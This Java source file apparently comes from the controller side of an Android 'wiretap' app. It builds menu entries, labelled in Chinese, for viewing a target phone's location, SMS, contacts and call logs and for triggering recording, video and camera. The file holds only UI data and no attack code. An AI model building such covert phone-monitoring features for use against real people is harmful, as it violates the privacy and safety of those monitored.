package com.pgw.wiretap.control.domain;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.pgw.wiretap.control.R;
import com.pgw.wiretap.control.R.drawable;

import android.content.Context;
import android.content.res.Resources;

public class MyData {

	public static List<Map<String, Object>> getCtrlListViewData() {
		List<Map<String, Object>> list=new ArrayList<Map<String,Object>>();
			
		Map<String, Object> wifi=new HashMap<String, Object>();
		wifi.put("icon", R.drawable.ic_seting);
		wifi.put("text", "设置");
		list.add(wifi);
		Map<String, Object> location=new HashMap<String, Object>();
		location.put("icon", R.drawable.ic_location);
		location.put("text", "位置");
		list.add(location);
		Map<String, Object> sms=new HashMap<String, Object>();
		sms.put("icon", R.drawable.ic_sms);
		sms.put("text", "短信");
		list.add(sms);
		Map<String, Object> contact=new HashMap<String, Object>();
		contact.put("icon", R.drawable.ic_contact);
		contact.put("text", "联系人");
		list.add(contact);
		Map<String, Object> calls=new HashMap<String, Object>();
		calls.put("icon", R.drawable.ic_calls);
		calls.put("text", "通话记录");
		list.add(calls);
		Map<String, Object> voice=new HashMap<String, Object>();
		voice.put("icon", R.drawable.ic_voice);
		voice.put("text", "录音");
		list.add(voice);
		Map<String, Object> video=new HashMap<String, Object>();
		video.put("icon", R.drawable.ic_video);
		video.put("text", "录像");
		list.add(video);
		Map<String, Object> camera=new HashMap<String, Object>();
		camera.put("icon", R.drawable.ic_camera);
		camera.put("text", "照相");
		list.add(camera);
//		list.add("WIFI控制");
//		list.add("查看位置");
//		list.add("查看短信");
//		list.add("查看通讯录");
//		list.add("查看通话记录");
//		list.add("录音控制");
//		list.add("录相控制");
//		list.add("照相控制");
//		list.add("给别人打电话");
//		list.add("给别人发短信");
		return list;
	}

	public static List<String> getPhoneCtrlListData() {
		List<String> list=new ArrayList<String>();
		list.add("查看联系人");
		list.add("查看短信");
		return list;
	}

	public static List<Map<String, Object>> getContactsListData() {
		List<Map<String, Object>> list=new ArrayList<Map<String,Object>>();
		Map<String, Object> map=new HashMap<String, Object>();
		return list;
	}

	public static List<Map<String, Object>> getOnlieSpinnerData() {
		List<Map<String, Object>> list=new ArrayList<Map<String,Object>>();
		Map<String, Object> select=new HashMap<String, Object>();
		select.put("icon", R.drawable.ic_contact);
		select.put("text", "请选择接受者");
		list.add(select);
		return list;
	}


}
